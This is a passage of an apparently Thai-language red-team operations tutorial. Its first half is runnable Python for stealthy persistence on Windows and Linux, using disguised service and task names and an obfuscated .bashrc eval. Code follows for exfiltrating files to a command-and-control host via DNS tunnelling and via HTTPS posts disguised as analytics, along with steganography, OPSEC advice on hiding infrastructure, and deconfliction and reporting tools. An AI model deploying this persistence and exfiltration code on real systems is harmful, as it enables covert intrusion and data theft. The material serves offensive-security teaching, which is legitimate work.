class WindowsPersistence:
    """
    Windows persistence techniques — ใช้ในสภาพแวดล้อม authorized testing เท่านั้น
    """

    def registry_run_key(
        self, payload_path: str,
        key_name: str = "WindowsSecurityHealth",
        hive: str = "HKCU"  # HKCU ไม่ต้องการ admin
    ) -> bool:
        """Persistence ผ่าน Registry Run key"""
        try:
            if hive == "HKCU":
                base = winreg.HKEY_CURRENT_USER
            else:
                base = winreg.HKEY_LOCAL_MACHINE

            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(base, key_path, 0,
                                 winreg.KEY_WRITE)
            winreg.SetValueEx(key, key_name, 0,
                              winreg.REG_SZ, payload_path)
            winreg.CloseKey(key)
            print(f"[+] Registry Run key set: {hive}\\{key_path}\\{key_name}")
            return True
        except Exception as e:
            print(f"[-] Failed: {e}")
            return False

    def scheduled_task(
        self, payload: str, task_name: str = "MicrosoftEdgeUpdateTask",
        frequency: str = "MINUTE", interval: int = 30,
        run_as_system: bool = False
    ) -> bool:
        """Persistence ผ่าน Scheduled Task"""
        cmd = [
            "schtasks", "/create",
            "/tn", task_name,
            "/tr", payload,
            "/sc", frequency,
            "/mo", str(interval),
            "/f"  # force overwrite
        ]
        if run_as_system:
            cmd += ["/ru", "SYSTEM"]

        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"[+] Scheduled task created: {task_name}")
        else:
            print(f"[-] Failed: {result.stderr}")
        return result.returncode == 0

    def wmi_event_subscription(self, payload: str) -> bool:
        """
        WMI Event Subscription — persistence ที่ stealthy มาก
        ทำงานโดยไม่มีไฟล์ใน disk (fileless)
        """
        ps_script = f"""
$FilterArgs = @{{
    EventNamespace = 'root/cimv2'
    Name = 'WindowsUpdateFilter'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
    QueryLanguage = 'WQL'
}}
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{{
    Name = 'WindowsUpdateConsumer'
    CommandLineTemplate = '{payload}'
}}
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$BindingArgs = @{{
    Filter = [Ref] $Filter
    Consumer = [Ref] $Consumer
}}
New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $BindingArgs
"""
        result = subprocess.run(
            ["powershell", "-Command", ps_script],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            print("[+] WMI Event Subscription created (fires 4-5 minutes after boot)")
        return result.returncode == 0

    def dll_hijacking(
        self, target_dir: str, dll_name: str, payload_path: str
    ) -> bool:
        """
        DLL Search Order Hijacking
        วาง malicious DLL ในตำแหน่งที่ app จะโหลดก่อน System32
        """
        dest = Path(target_dir) / dll_name
        # ตรวจสอบว่า DLL นี้ไม่มีอยู่ใน target_dir (ถ้ามีคือไม่ใช่ hijack)
        if dest.exists():
            print(f"[!] DLL already exists at {dest} — not a hijack opportunity")
            return False
        # Copy payload as DLL
        import shutil
        shutil.copy2(payload_path, dest)
        print(f"[+] DLL placed for hijacking: {dest}")
        print(f"    Trigger: run {Path(target_dir).name}")
        return True

    def startup_folder(
        self, payload_path: str, link_name: str = "WindowsUpdate.lnk"
    ) -> str:
        """วาง payload ใน Startup folder"""
        startup = Path(os.environ["APPDATA"]) / \
                  "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        dest = startup / link_name
        import shutil
        shutil.copy2(payload_path, dest)
        print(f"[+] Payload placed in Startup: {dest}")
        return str(dest)


class LinuxPersistence:
    """Linux/Unix persistence techniques"""

    def crontab(
        self, payload: str, schedule: str = "*/5 * * * *",
        user: str = None
    ) -> bool:
        """Persistence ผ่าน cron"""
        entry = f"{schedule} {payload}\n"
        if user and os.geteuid() == 0:
            cron_file = f"/var/spool/cron/crontabs/{user}"
        else:
            # ใช้ current user crontab
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            existing = result.stdout if result.returncode == 0 else ""
            proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
            proc.communicate((existing + entry).encode())
            print(f"[+] Crontab entry added: {schedule}")
            return proc.returncode == 0

    def bashrc_persistence(self, payload: str) -> bool:
        """Persistence ผ่าน .bashrc / .profile"""
        home = Path.home()
        targets = [home / ".bashrc", home / ".bash_profile", home / ".profile"]
        # ซ่อน payload ด้วย obfuscation
        obfuscated = f"eval $(echo '{payload}' | base64 -d) 2>/dev/null"
        comment = f"# {obfuscated}"  # เพิ่ม comment ก่อนเพื่อ confusion
        for target in targets:
            if target.exists():
                with open(target, 'a') as f:
                    f.write(f"\n{obfuscated}\n")
                print(f"[+] Added to {target}")
                return True
        return False

    def systemd_service(
        self, payload: str, service_name: str = "systemd-update",
        user_service: bool = True
    ) -> bool:
        """Persistence ผ่าน systemd service"""
        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={payload}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""
        if user_service:
            service_dir = Path.home() / ".config" / "systemd" / "user"
        else:
            service_dir = Path("/etc/systemd/system")

        service_dir.mkdir(parents=True, exist_ok=True)
        service_file = service_dir / f"{service_name}.service"

        with open(service_file, 'w') as f:
            f.write(service_content)

        if user_service:
            subprocess.run(["systemctl", "--user", "enable", "--now",
                            f"{service_name}.service"])
        else:
            subprocess.run(["systemctl", "enable", "--now",
                            f"{service_name}.service"])

        print(f"[+] Systemd service installed: {service_file}")
        return True

    def ld_preload(
        self, malicious_lib: str,
        target: str = "/etc/ld.so.preload"  # ต้องการ root
    ) -> bool:
        """LD_PRELOAD hijacking — hook library functions"""
        if not os.path.exists(malicious_lib):
            print(f"[-] Library not found: {malicious_lib}")
            return False
        with open(target, 'a') as f:
            f.write(f"{malicious_lib}\n")
        print(f"[+] LD_PRELOAD set: {malicious_lib} -> {target}")
        return True
```

---

## 7. Data Exfiltration

### 7.1 Covert Exfiltration Channels
```python
#!/usr/bin/env python3
# exfiltration.py — เทคนิค data exfiltration ที่ bypasses DLP

import base64
import dns.resolver
import dns.query
import dns.message
import socket
import subprocess
import zlib
from pathlib import Path
from typing import Optional

class DNSTunnelExfil:
    """
    DNS Tunneling — ส่งข้อมูลผ่าน DNS TXT queries
    ผ่านได้แม้แต่ firewall ที่ block HTTP/HTTPS
    """

    def __init__(self, c2_domain: str, dns_server: str = "8.8.8.8"):
        self.domain = c2_domain
        self.dns_server = dns_server
        self.chunk_size = 40  # bytes per DNS label
        self.max_label_length = 63

    def encode_data(self, data: bytes) -> str:
        """เข้ารหัสข้อมูลสำหรับส่งผ่าน DNS"""
        compressed = zlib.compress(data)
        return base64.b32encode(compressed).decode().rstrip('=')

    def send_chunk(self, chunk: str, seq: int, total: int) -> bool:
        """ส่งข้อมูล 1 chunk ผ่าน DNS query"""
        # format: <seq>.<total>.<data>.<domain>
        query_name = f"{seq}.{total}.{chunk}.{self.domain}"
        try:
            request = dns.message.make_query(query_name, dns.rdatatype.TXT)
            dns.query.udp(request, self.dns_server, timeout=5)
            return True
        except Exception as e:
            print(f"[-] DNS send error: {e}")
            return False

    def exfiltrate_file(self, file_path: str) -> bool:
        """ส่งไฟล์ผ่าน DNS tunnel"""
        data = Path(file_path).read_bytes()
        print(f"[*] Exfiltrating {file_path} ({len(data)} bytes) via DNS")

        encoded = self.encode_data(data)
        # แบ่งเป็น chunks
        chunks = [encoded[i:i+self.chunk_size]
                  for i in range(0, len(encoded), self.chunk_size)]

        print(f"[*] Sending {len(chunks)} DNS queries...")
        success = 0
        for seq, chunk in enumerate(chunks):
            if self.send_chunk(chunk, seq, len(chunks)):
                success += 1
            import time; time.sleep(0.1)  # throttle

        print(f"[+] Sent {success}/{len(chunks)} chunks")
        return success == len(chunks)


class HTTPSExfil:
    """
    HTTPS Exfiltration — ส่งข้อมูลผ่าน HTTPS ไปยัง C2
    ปลอมเป็น legitimate web traffic
    """

    def __init__(self, c2_url: str):
        self.c2 = c2_url

    def exfiltrate_chunks(
        self, data: bytes, chunk_size: int = 65536
    ) -> bool:
        """ส่งข้อมูลเป็น chunks ผ่าน HTTPS POST"""
        import requests
        import hashlib
        import time
        import random

        total_chunks = (len(data) + chunk_size - 1) // chunk_size
        file_id = hashlib.md5(data[:1024]).hexdigest()[:8]

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/octet-stream",
            "X-Request-ID": file_id
        }

        for i in range(total_chunks):
            chunk = data[i*chunk_size:(i+1)*chunk_size]
            encoded = base64.b64encode(zlib.compress(chunk)).decode()

            # ปลอม HTTP parameter เป็น normal analytics data
            resp = requests.post(
                f"{self.c2}/analytics",
                json={
                    "session_id": file_id,
                    "page": f"/{i}",
                    "total": total_chunks,
                    "data": encoded,
                    "ts": int(time.time())
                },
                headers=headers,
                verify=False
            )

            if resp.status_code == 200:
                print(f"[+] Chunk {i+1}/{total_chunks} sent")
            else:
                print(f"[-] Chunk {i+1} failed: {resp.status_code}")
                return False

            # Random delay ระหว่าง 0.5-2 วินาที
            time.sleep(random.uniform(0.5, 2.0))

        return True

    def exfiltrate_via_image(
        self, data: bytes, image_output: str
    ) -> bool:
        """Steganography — ซ่อนข้อมูลใน PNG image"""
        from PIL import Image
        import io
        import numpy as np

        # สร้าง noise image เพื่อซ่อนข้อมูล
        compressed = zlib.compress(data)
        data_bits = ''.join(format(byte, '08b') for byte in compressed)
        data_bits += '0' * (8 - len(data_bits) % 8)  # padding

        # ต้องการ pixel อย่างน้อยเท่ากับ len(data_bits)/3 pixels
        min_pixels = len(data_bits) // 3 + 1
        size = int(min_pixels ** 0.5) + 1

        img = Image.new('RGB', (size, size), color='white')
        pixels = img.load()

        bit_idx = 0
        for y in range(size):
            for x in range(size):
                if bit_idx < len(data_bits):
                    r, g, b = pixels[x, y]
                    # ซ่อนข้อมูลใน LSB ของแต่ละ channel
                    r = (r & 0xFE) | int(data_bits[bit_idx])
                    bit_idx += 1
                    if bit_idx < len(data_bits):
                        g = (g & 0xFE) | int(data_bits[bit_idx])
                        bit_idx += 1
                    if bit_idx < len(data_bits):
                        b = (b & 0xFE) | int(data_bits[bit_idx])
                        bit_idx += 1
                    pixels[x, y] = (r, g, b)

        img.save(image_output)
        print(f"[+] Data hidden in {image_output} ({size}x{size} pixels)")
        return True
```

---

## 8. OPSEC for Red Teamers

### 8.1 Infrastructure OPSEC
```python
#!/usr/bin/env python3
# opsec_checker.py — ตรวจสอบ OPSEC ของ red team infrastructure

import requests
import socket
import subprocess
from typing import List, Dict

class OPSECChecker:
    """
    ตรวจสอบ OPSEC issues ก่อน/ระหว่าง operation
    """

    def __init__(self):
        self.issues = []
        self.warnings = []

    def check_c2_exposure(
        self, c2_ips: List[str], allowed_ports: List[int] = [443, 80]
    ) -> Dict:
        """ตรวจสอบว่า Teamserver ถูกเปิดเผยโดยตรงไหม"""
        results = {}
        for ip in c2_ips:
            open_ports = []
            for port in range(1, 65536):
                if port not in [22, 50050, 40056, 443, 80]:  # ตรวจเฉพาะ sensitive ports
                    continue
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                if s.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
                s.close()

            if 50050 in open_ports:  # Cobalt Strike default port
                self.issues.append(f"CRITICAL: Cobalt Strike port 50050 open on {ip}")
            if 40056 in open_ports:  # Havoc default port
                self.issues.append(f"CRITICAL: Havoc port 40056 open on {ip}")

            results[ip] = open_ports
        return results

    def check_ssl_certificate(self, domain: str) -> Dict:
        """ตรวจสอบว่า SSL cert ไม่เปิดเผยข้อมูล operator"""
        import ssl
        import json

        ctx = ssl.create_default_context()
        try:
            with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
                s.connect((domain, 443))
                cert = s.getpeercert()
                # ตรวจสอบ cert fields
                issues = []
                subject = dict(x[0] for x in cert['subject'])
                issuer = dict(x[0] for x in cert['issuer'])

                # ใช้ self-signed หรือ operator org ใน cert หรือไม่
                if issuer.get('organizationName', '') in [
                    'Red Team", "Pentest", "Security Research'
                ]:
                    issues.append("Cert org reveals operation nature")

                san = [v for k, v in cert.get('subjectAltName', []) if k == 'DNS']
                return {"domain": domain, "cert": subject, "san": san, "issues": issues}
        except Exception as e:
            return {"domain": domain, "error": str(e)}

    def check_payload_av_detection(self, payload_path: str) -> Dict:
        """ส่ง payload ไป VirusTotal เพื่อตรวจสอบ detection rate"""
        import hashlib

        with open(payload_path, 'rb') as f:
            data = f.read()
        sha256 = hashlib.sha256(data).hexdigest()

        # ตรวจ hash บน VT (ไม่ upload file จริง — ป้องกัน payload leak)
        url = f"https://www.virustotal.com/api/v3/files/{sha256}"
        headers = {"x-apikey": "YOUR_VT_API_KEY"}
        resp = requests.get(url, headers=headers)

        if resp.status_code == 404:
            return {"status": "not_seen", "detections": 0}
        elif resp.status_code == 200:
            data = resp.json()
            stats = data["data"]["attributes"]["last_analysis_stats"]
            detections = stats.get("malicious", 0)
            total = sum(stats.values())
            if detections > 5:
                self.issues.append(
                    f"OPSEC: Payload detected by {detections}/{total} AV engines"
                )
            return {"status": "seen", "detections": detections, "total": total}
        return {"status": "error", "code": resp.status_code}

    def check_domain_reputation(self, domain: str) -> Dict:
        """ตรวจสอบว่า domain ที่ใช้ไม่ถูก blacklist"""
        checks = {}

        # ตรวจ domain age (domain ใหม่ < 30 วันน่าสงสัยมาก)
        try:
            import whois
            w = whois.whois(domain)
            creation = w.creation_date
            if isinstance(creation, list):
                creation = creation[0]
            from datetime import datetime
            age_days = (datetime.now() - creation).days
            checks["domain_age_days"] = age_days
            if age_days < 30:
                self.warnings.append(f"OPSEC: Domain {domain} is only {age_days} days old")
        except Exception as e:
            checks["whois_error"] = str(e)

        # ตรวจ Spamhaus
        try:
            reversed_ip = '.'.join(reversed(socket.gethostbyname(domain).split('.')))
            lookup = f"{reversed_ip}.zen.spamhaus.org"
            socket.gethostbyname(lookup)
            self.issues.append(f"CRITICAL: Domain {domain} is in Spamhaus blacklist")
            checks["spamhaus"] = "BLACKLISTED"
        except socket.gaierror:
            checks["spamhaus"] = "clean"

        return checks

    def generate_opsec_report(self) -> str:
        """สร้าง OPSEC report"""
        report = "=" * 60 + "\nOPSEC Assessment Report\n" + "=" * 60
        if self.issues:
            report += "\n\n[CRITICAL ISSUES]\n"
            for issue in self.issues:
                report += f"  [!] {issue}\n"
        if self.warnings:
            report += "\n[WARNINGS]\n"
            for warning in self.warnings:
                report += f"  [*] {warning}\n"
        if not self.issues and not self.warnings:
            report += "\n[+] No OPSEC issues detected\n"
        return report


# ตรวจสอบ OPSEC ก่อน operation
checker = OPSECChecker()
print(checker.check_ssl_certificate("c2.example.com"))
print(checker.check_domain_reputation("updates.example.com"))
print(checker.generate_opsec_report())
```

### 8.2 Operational Security Checklist
```
=== Pre-Operation OPSEC Checklist ===

Infrastructure
  [ ] Teamserver ซ่อนอยู่หลัง redirectors — ไม่ expose โดยตรง
  [ ] C2 domain อายุ > 30 วัน (preferably > 1 ปี)
  [ ] Domain categorized เป็น legitimate (IT/Software/Finance)
  [ ] SSL cert ไม่เปิดเผยข้อมูล operator
  [ ] Redirector กรอง traffic ที่ไม่ใช่ Beacon
  [ ] Operator เชื่อมผ่าน VPN/Tor ก่อนเข้า Teamserver
  [ ] ทุก infra จ่ายผ่าน cryptocurrency / prepaid card
  [ ] ไม่ใช้ personal email ในการซื้อ VPS/domain

Payload OPSEC
  [ ] Payload ผ่าน AV evasion (< 5/72 detections บน VT)
  [ ] ไม่ upload payload ไป VT โดยตรง — ตรวจ hash เท่านั้น
  [ ] Staging server แยกจาก C2 server
  [ ] Payload มี kill date (ทำลายตัวเองหลัง engagement)
  [ ] Beacon sleep > 30 วินาที ใน production
  [ ] ใช้ Malleable C2 profile ให้เหมาะสมกับ target environment

Operation OPSEC
  [ ] บันทึก timestamped log ทุก action (deconfliction)
  [ ] ไม่โจมตีนอก scope ที่กำหนดใน RoE
  [ ] มี kill switch (Emergency Stop Procedure) พร้อม
  [ ] Cleanup ทุก artifact หลัง objective บรรลุ
  [ ] Screenshot/document ทุก finding เป็น evidence
  [ ] ไม่ใช้ tools/exploits ที่อาจทำให้ระบบ production พัง
```

---

## 9. Deconfliction & Coordination

### 9.1 Deconfliction ระบบ
```python
#!/usr/bin/env python3
# deconfliction.py — ระบบ deconfliction สำหรับ Red Team

from dataclasses import dataclass, field
from datetime import datetime
from typing import List, Optional
import json
import hashlib

@dataclass
class Action:
    """บันทึก action ทุกอย่างที่ Red Team ทำ"""
    timestamp: str
    operator: str
    target_host: str
    target_ip: str
    action_type: str          # recon, exploit, persistence, exfil, lateral
    technique_id: str         # MITRE ATT&CK ID
    tool_used: str
    command_executed: str
    outcome: str              # success, failed, unknown
    artifacts_created: List[str] = field(default_factory=list)
    notes: str = ""

    def action_id(self) -> str:
        """สร้าง unique ID สำหรับ action นี้"""
        data = f"{self.timestamp}{self.operator}{self.target_ip}{self.command_executed}"
        return hashlib.sha256(data.encode()).hexdigest()[:12]


class DeconflictionSystem:
    """
    ระบบ deconfliction — บันทึกและแชร์ Red Team actions กับ White Team
    เพื่อป้องกัน Blue Team ตอบสนองต่อ real attack ที่เกิดขึ้นพร้อมกัน
    """

    def __init__(self, operation_name: str, white_team_contact: str):
        self.operation = operation_name
        self.white_team = white_team_contact
        self.actions: List[Action] = []
        self.scope_ips: List[str] = []
        self.scope_domains: List[str] = []
        self.stop_list: List[str] = []  # IPs ที่ห้ามแตะ

    def log_action(self, action: Action):
        """บันทึก action พร้อม unique ID"""
        action_id = action.action_id()
        self.actions.append(action)
        print(f"[LOG] {action_id} | {action.timestamp} | "
              f"{action.operator} | {action.target_ip} | "
              f"{action.technique_id}")
        return action_id

    def check_scope(self, ip: str) -> bool:
        """ตรวจสอบว่า IP อยู่ใน scope หรือไม่"""
        if ip in self.stop_list:
            print(f"[!] STOP: {ip} is on the stop list — do not attack!")
            return False
        if not self.scope_ips:  # ถ้าไม่ได้กำหนด scope = ทดสอบทุก IP
            return True
        in_scope = ip in self.scope_ips
        if not in_scope:
            print(f"[!] OUT OF SCOPE: {ip} — not authorized")
        return in_scope

    def export_deconfliction_report(self, output: str):
        """ส่ง report ให้ White Team"""
        report = {
            "operation": self.operation,
            "generated": datetime.utcnow().isoformat(),
            "total_actions": len(self.actions),
            "actions": [
                {
                    "id": a.action_id(),
                    "time": a.timestamp,
                    "operator": a.operator,
                    "host": a.target_host,
                    "ip": a.target_ip,
                    "technique": a.technique_id,
                    "tool": a.tool_used,
                    "outcome": a.outcome,
                    "artifacts": a.artifacts_created
                } for a in self.actions
            ]
        }
        with open(output, "w") as f:
            json.dump(report, f, indent=2)
        print(f"[+] Deconfliction report saved: {output}")
        print(f"[*] Send to White Team: {self.white_team}")

    def get_summary_by_operator(self) -> dict:
        """สรุป actions แยกตาม operator"""
        summary = {}
        for action in self.actions:
            if action.operator not in summary:
                summary[action.operator] = {"total": 0, "techniques": set()}
            summary[action.operator]["total"] += 1
            summary[action.operator]["techniques"].add(action.technique_id)
        # convert sets to lists for JSON serialization
        for op in summary:
            summary[op]["techniques"] = list(summary[op]["techniques"])
        return summary
```

---

## 10. Red Team Reporting

### 10.1 Executive Summary Structure
```
Red Team Report Structure
=========================

1. Executive Summary (2-3 หน้า — สำหรับ C-Suite)
   - Operation overview
   - Overall risk rating (Critical/High/Medium/Low)
   - Key findings (3-5 bullet points)
   - Business impact
   - Immediate recommendations

2. Methodology (1-2 หน้า)
   - Scope and constraints
   - Threat actor simulated
   - Phases conducted
   - Rules of Engagement summary

3. Attack Narrative (10-20+ หน้า)
   - Phase-by-phase story of the attack
   - บรรยายจากมุมมอง attacker ("We did X → X happened → we pivoted to Y")
   - Screenshots และ evidence
   - MITRE ATT&CK mapping
   - Timeline

4. Technical Findings (per finding)
   - Finding title
   - Risk rating
   - Affected systems
   - Description
   - Evidence/PoC
   - Business impact
   - Recommendation
   - References

5. Detection Analysis
   - Timeline: เวลาที่ Red Team เริ่มกับเวลาที่ Blue Team ตรวจพบ (ถ้าพบ)
   - Detection gaps: TTP ที่ไม่ถูกตรวจพบ
   - Suggested detections (SIGMA rules, YARA, Splunk queries)

6. Purple Team Recommendations
   - Workshop topics
   - Detection improvements
   - Response playbooks ที่ควรสร้าง

7. Appendices
   - Full IOC list
   - MITRE ATT&CK Navigator layer
   - Tool list
   - Deconfliction log
```

### 10.2 Automated Report Generator
```python
#!/usr/bin/env python3
# red_team_report.py — สร้าง red team report อัตโนมัติ

from dataclasses import dataclass, field
from typing import List, Dict
from datetime import datetime
import json

@dataclass
class Finding:
    title: str
    risk: str           # Critical, High, Medium, Low, Informational
    hosts: List[str]
    description: str
    evidence: str
    impact: str
    recommendation: str
    mitre_ids: List[str] = field(default_factory=list)

@dataclass
class AttackPhase:
    name: str           # Initial Access, Lateral Movement, etc.
    objective: str
    outcome: str        # success, partial, failed
    ttps: List[str] = field(default_factory=list)
    narrative: str = ""


class RedTeamReport:
    def __init__(
        self, operation_name: str, client: str,
        start_date: str, end_date: str,
        threat_actor: str
    ):
        self.operation = operation_name
        self.client = client
        self.start_date = start_date
        self.end_date = end_date
        self.threat_actor = threat_actor
        self.findings: List[Finding] = []
        self.phases: List[AttackPhase] = []
        self.objectives_achieved: List[str] = []
        self.iocs: List[str] = []
        self.detection_gaps: List[str] = []

    def add_finding(self, finding: Finding):
        self.findings.append(finding)

    def add_phase(self, phase: AttackPhase):
        self.phases.append(phase)

    def get_risk_summary(self) -> Dict:
        summary = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Informational": 0}
        for f in self.findings:
            summary[f.risk] = summary.get(f.risk, 0) + 1
        return summary

    def get_overall_risk(self) -> str:
        summary = self.get_risk_summary()
        if summary["Critical"] > 0:
            return "Critical"
        elif summary["High"] > 0:
            return "High"
        elif summary["Medium"] > 0:
            return "Medium"
        return "Low"

    def generate_markdown(self) -> str:
        """สร้าง Markdown report"""
        risk_summary = self.get_risk_summary()
        overall = self.get_overall_risk()
        now = datetime.utcnow().strftime("%Y-%m-%d")

        # Risk badge
        risk_colors = {
            "Critical": "🔴", "High": "🟠",
            "Medium": "🟡", "Low": "🟢"
        }

        md = f"""# Red Team Assessment Report
## {self.operation}

**Client:** {self.client}
**Assessment Period:** {self.start_date} – {self.end_date}
**Report Date:** {now}
**Threat Actor Simulated:** {self.threat_actor}
**Overall Risk:** {risk_colors.get(overall, '')} {overall}

---

## Executive Summary

This report presents the findings of a Red Team assessment conducted against {self.client} from {self.start_date} to {self.end_date}. The assessment simulated tactics, techniques, and procedures (TTPs) associated with {self.threat_actor}.

### Risk Summary

| Severity | Count |
|---|---|
| 🔴 Critical | {risk_summary['Critical']} |
| 🟠 High | {risk_summary['High']} |
| 🟡 Medium | {risk_summary['Medium']} |
| 🟢 Low | {risk_summary['Low']} |

### Objectives

"""
        for obj in self.objectives_achieved:
            md += f"- ✅ {obj}\n"

        md += "\n---\n\n## Attack Narrative\n\n"
        for phase in self.phases:
            status_icon = "✅" if phase.outcome == "success" else (
                "⚠️" if phase.outcome == "partial" else "❌"
            )
            md += f"### {status_icon} Phase: {phase.name}\n\n"
            md += f"**Objective:** {phase.objective}\n\n"
            md += f"**Outcome:** {phase.outcome.capitalize()}\n\n"
            if phase.ttps:
                md += "**TTPs:** " + ", ".join(f"`{t}`" for t in phase.ttps) + "\n\n"
            if phase.narrative:
                md += f"{phase.narrative}\n\n"

        md += "---\n\n## Technical Findings\n\n"
        for i, finding in enumerate(self.findings, 1):
            md += f"### {i}. {finding.title}\n\n"
            md += f"**Risk:** {risk_colors.get(finding.risk, '')} {finding.risk}\n\n"
            md += f"**Affected Hosts:** {', '.join(finding.hosts)}\n\n"
            md += f"**Description:**\n{finding.description}\n\n"
            md += f"**Evidence:**\n```\n{finding.evidence}\n```\n\n"
            md += f"**Business Impact:**\n{finding.impact}\n\n"
            md += f"**Recommendation:**\n{finding.recommendation}\n\n"
            if finding.mitre_ids:
                md += "**MITRE ATT&CK:** " + ", ".join(
                    f"[{m}](https://attack.mitre.org/techniques/{m.replace('.', '/')}/)"
                    for m in finding.mitre_ids
                ) + "\n\n"
            md += "---\n\n"

        if self.detection_gaps:
            md += "## Detection Gaps\n\n"
            md += "The following TTPs were NOT detected by the Blue Team:\n\n"
            for gap in self.detection_gaps:
                md += f"- {gap}\n"

        if self.iocs:
            md += "\n## Indicators of Compromise\n\n"
            md += "```\n" + "\n".join(self.iocs) + "\n```\n"

        return md

    def save(self, output_path: str):
        content = self.generate_markdown()
        with open(output_path, 'w') as f:
            f.write(content)
        print(f"[+] Report saved: {output_path}")
        return output_path


# ตัวอย่างการสร้าง report
if __name__ == "__main__":
    report = RedTeamReport(
        operation_name="Operation BlackSwan",
        client="ACME Financial Corp",
        start_date="2024-01-15",
        end_date="2024-02-28",
        threat_actor="APT29 (Cozy Bear)"
    )

    report.objectives_achieved = [
        "Achieved initial access via spearphishing",
        "Obtained Domain Admin privileges",
        "Accessed Crown Jewel: HR database (150K PII records)",
        "Exfiltrated 2.3 GB of data undetected for 47 days"
    ]

    report.add_phase(AttackPhase(
        name="Initial Access",
        objective="Gain foothold in ACME network",
        outcome="success",
        ttps=["T1566.001", "T1204.002"],
        narrative="Sent targeted spearphishing email to 3 finance employees. One opened the attachment within 4 hours, providing initial access."
    ))

    report.add_finding(Finding(
        title="Domain Admin via Kerberoasting",
        risk="Critical",
        hosts=["dc01.acme.local", "fileserver01.acme.local"],
        description="After obtaining initial access, we identified a service account with an SPN set and a weak password. Kerberoasting the account yielded a crackable TGS hash.",
        evidence="$krb5tgs$23$*svc_backup$ACME.LOCAL$backup/dc01.acme.local...",
        impact="Any authenticated domain user can obtain Domain Admin privileges within minutes, leading to complete domain compromise.",
        recommendation="Enforce minimum 25-character passwords for service accounts. Implement Protected Users security group. Enable AES-only Kerberos encryption.",
        mitre_ids=["T1558.003"]
    ))

    report.detection_gaps = [
        "T1566.001 — Spearphishing attachment (bypassed email gateway)",
        "T1558.003 — Kerberoasting (no alert on TGS requests)",
        "T1003.006 — DCSync (no alert on replication requests from non-DC)"
    ]

    report.iocs = [
        "SHA256: a1b2c3d4e5f6... (malicious Excel file)",
        "IP: 185.x.x.x (C2 server)",
        "Domain: updates.legitimate-software.com (C2 domain)"
    ]

    report.save("red_team_report.md")
```

---

## สรุป Red Team Operations

| ขั้นตอน | เครื่องมือหลัก | MITRE Tactic |
|---|---|---|
| Planning | TIBER-EU, ATT&CK | N/A |
| Infrastructure | Redirectors, CDN, Domain Fronting | N/A |
| Initial Access | GoPhish, HTA, ISO dropper | TA0001 |
| Execution | Cobalt Strike, Sliver, Havoc | TA0002 |
| Persistence | Registry, WMI, Scheduled Tasks | TA0003 |
| Lateral Movement | impacket, WMI, WinRM, DCOM | TA0008 |
| Privilege Escalation | Kerberoasting, Golden Ticket | TA0004 |
| Exfiltration | DNS Tunnel, HTTPS, Steganography | TA0010 |
| Reporting | MITRE Navigator, Markdown | N/A |

### Red Team vs Blue Team คือ Purple Team
เมื่อ operation สิ้นสุด ผลลัพธ์ที่ดีที่สุดคือการทำ **Purple Team Exercise** — Red Team replay แต่ละ TTP ให้ Blue Team ดูและตั้ง detection rule ในเวลาเดียวกัน ทำให้องค์กรแข็งแกร่งขึ้นจริงๆ

---

← [Part 85: OSINT Advanced](Part-85-OSINT-Advanced.md) | [Part 87: Blue Team & Defensive Security](Part-87-Blue-Team-Defensive.md) →
